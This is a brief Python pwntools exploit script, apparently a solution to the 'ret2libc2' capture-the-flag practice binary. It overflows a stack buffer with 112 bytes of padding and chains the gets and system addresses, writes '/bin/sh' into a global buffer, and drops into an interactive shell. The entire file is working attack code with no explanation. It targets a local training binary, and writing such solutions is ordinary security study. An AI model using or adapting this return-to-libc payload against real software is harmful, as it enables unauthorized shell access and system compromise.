from pwn import*
 
r=process('./ret2libc2')
 
sys_adr=0x08048490
gets_adr=0x08048460
buf2_adr=0x0804A080
 
 
payload=flat([112*'A',gets_adr,sys_adr,buf2_adr,buf2_adr])
 
r.sendline(payload)
r.sendline('/bin/sh')
r.interactive()           
